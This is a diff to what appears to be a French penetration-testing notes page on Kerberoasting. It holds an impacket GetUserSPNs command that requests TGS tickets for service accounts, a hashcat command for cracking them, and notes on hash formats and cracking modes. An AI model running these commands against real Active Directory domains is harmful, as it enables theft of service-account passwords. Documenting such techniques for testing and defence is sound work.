@@ -10,6 +10,10 @@ description: A finir
 GetUsersSPN.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
 ```
 
+Cette commande va recenser tous les comptes utilisateur (non machine) exécutant un service pour émettre une demande de ticket TGS en leur nom. Ces tickets seront ensuite affichés.
+
+Il n'est pas possible de réaliser de _Pass The Ticket_ avec les TGS.
+
 ### Cassage des hashs obtenus
 
 ```
@@ -20,5 +24,5 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 Plusieurs format de hash peuvent être obtenu :
 
 * $17 : AES128
-* $18 : AES256 (-m 19700 sur [hashcat](broken-reference), pas pris en compte par [john](broken-reference))
-* $23 : RC4-HMAC-MD5 (pris en compte par [john](broken-reference))
+* $18 : AES256 (-m 19700 sur hashcat, pas pris en compte par john)
+* $23 : RC4-HMAC-MD5 (pris en compte par john)
